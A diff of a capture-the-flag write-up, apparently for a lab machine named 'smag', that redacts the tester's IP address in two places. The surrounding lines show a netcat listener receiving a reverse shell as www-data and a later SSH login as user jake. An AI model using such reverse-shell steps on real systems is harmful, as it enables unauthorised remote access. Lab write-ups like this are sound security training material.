@@ -85,7 +85,7 @@ Now, we can check basic details like `whoami`, `pwd` and check if we can access 
 ```
 tester@kali:~$ nc -nvlp 4242
 listening on [any] 4242 ...
-connect to [10.8.91.135] from (UNKNOWN) [10.10.23.169] 52604
+connect to [10.x.x.x] from (UNKNOWN) [10.10.23.169] 52604
 /bin/sh: 0: can't access tty; job control turned off
 $ whoami
 www-data
@@ -157,7 +157,7 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage
 
-Last login: Sun Aug  2 17:58:41 2020 from 10.8.91.135
+Last login: Sun Aug  2 17:58:41 2020 from 10.x.x.x
 jake@smag:~$ 
 
 ```
